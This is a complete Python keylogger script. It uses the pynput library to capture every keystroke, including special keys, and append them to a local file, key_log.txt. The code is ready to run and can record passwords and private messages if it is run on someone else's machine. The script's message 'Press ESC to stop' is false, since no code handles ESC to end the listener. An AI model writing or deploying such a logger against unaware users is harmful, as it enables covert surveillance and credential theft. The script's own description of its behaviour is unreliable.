from pynput import keyboard

LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        # Normal character key
        char = key.char
        to_write = char + " "
    except AttributeError:
        # Special keys handling
        if key == keyboard.Key.space:
            to_write = "[space] "
        elif key == keyboard.Key.enter:
            to_write = "[enter] "
        elif key == keyboard.Key.tab:
            to_write = "[tab] "
        else:
            to_write = f"[{key.name}] "
    with open(LOG_FILE, "a") as f:
        f.write(to_write)



def main():
    print("Keyboard logging started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    print(f"Logging stopped. Keys saved in '{LOG_FILE}'")

if __name__ == "__main__":
    main()
